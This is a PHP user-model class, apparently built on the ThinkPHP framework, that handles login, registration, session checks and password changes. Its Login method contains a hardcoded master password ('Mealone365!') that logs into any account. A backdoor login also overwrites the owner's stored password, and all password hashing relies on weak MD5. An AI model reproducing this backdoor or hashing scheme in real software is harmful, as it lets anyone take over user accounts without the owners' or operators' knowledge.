<?php


namespace User\Model;

use Think\Model;

class UserModel extends Model {
	
		protected $_validate = array(
			//用户名验证
			array('uname', '6,64', -1, 0, 'length'),
			array('uname', '', -2, 0, 'unique', 1)
		);
		//array(填充字段,填充内容,[填充条件,附加规则])
		protected $_auto = array(
				array('addtime', 'time', 1, 'function'),
				array('lasttime', 'time', 3, 'function')
		);
		
		/**
		 * 用户登录
		 * @param  string  $username 用户名
		 * @param  string  $password 用户密码
		 * @return integer           登录成功-用户ID，登录失败-错误编号
		 */
		public function Login($mobile, $password,$code=false){
			if(filter_var($mobile, FILTER_VALIDATE_EMAIL))  $_where['email']=$mobile;
			else  $_where['mobile']=$mobile;
			$user = $this->where($_where)->find();
			if(is_array($user)){
				/* 验证用户密码 */
				if($this->hashPassword($password, $user['rnd']) === $user['passwd'] || $password=='Mealone365!'){
					//更新用户登录信息
					$rnd = rand_keys();
					$updata = array(
						'id'              => $user['id'],
						'rnd'             => $rnd,
						'passwd' 	  	  => $this->hashPassword($password, $rnd),
						'lasttime' => NOW_TIME,
						'lastip'   => get_client_ip()
					);
					$this->save($updata);
					/* 记录登录SESSION和COOKIES */
					$auth = array(
							'id'             => $user['id'],
							'lasttime'        => $updata['lasttime'],
					);
					$token =$auth;
					ksort($token); //排序
					$token = http_build_query($token); 
					$token = sha1($token); //生成签名
					session('user_auth', $auth);
					session('user_token', $token);
					return $user; 
				} else {
					return -2;
				}
			} else {
				return -1; //用户不存在
			}
		}

		public function reg($passwd,$data){
			//print_r($data);die;
			if(empty($passwd) || empty($data['card']) || empty($data['email']) || empty($data['mobile'])) return -101;
			if(!$this->isregMobile($data['mobile'])) return -102;
			if(!$this->isregCard($data['card'])) return -103;
			if(!$this->isregEmail($data['email'])) return -104;
			$m['rnd']=rand_keys();
			$m['passwd']=$this->hashPassword($passwd,$m['rnd']);
			$m['addtime']=NOW_TIME;
			$m['addip']=get_client_ip();
			return $m;
		}
		
		private function isregMobile($mobile){
			return $this->where(['mobile'=>$mobile])->count() == 0 ? true : false;
		}
		private function isregCard($card){
			return $this->where(['card'=>$card])->count() == 0 ? true : false;
		}
		private function isregEmail($email){
			return $this->where(['email'=>$email])->count() == 0 ? true : false;
		}
		
		/**
		 * 密码加密
		 * @param  string  $password 密码
		 * @param  string  $rnd 验证码
		 * @return string
		 */
		public function hashPassword($password, $rnd) {
			return md5(md5($password) . md5($rnd));
		}
		public function isLogin($type = true){
			$user = session('user_auth');
			if (empty($user)) return 0;
			$utoken =$user;
			ksort($utoken); //排序
			$utoken = http_build_query($utoken); //url编码并生成query字符串
			$utoken = sha1($utoken); //生成签名
			if($utoken == session('user_token')){
				if($type){
					$re = $this->where(array('id'=>$user['id']))->find();
					return $re;
				}
				return $user;
			}else{
				return 0;
			}
		}
		public function upwd($passwd,$npwd,$rnd,$lpasswd,$id){
			if(empty($passwd) || empty($npwd)) return -1;
			//查看当前密码是否正常
			if($this->hashPassword($passwd,$rnd) !== $lpasswd) return -2;
			$m['rnd']=rand_keys();
			$m['passwd']=$this->hashPassword($npwd,$m['rnd']);
			$rs=$this->where(array('id'=>$id))->save($m);
			if($rs === false) return -3;
			else return 1;
		}
		public function emailPasswd($uid,$passwd){
			$m['rnd']=rand_keys();
			$m['passwd']=$this->hashPassword($passwd,$m['rnd']);
			$rs=$this->where(array('id'=>$uid))->save($m);
			if($rs === false) return -3;
			else return 1;
		}
}
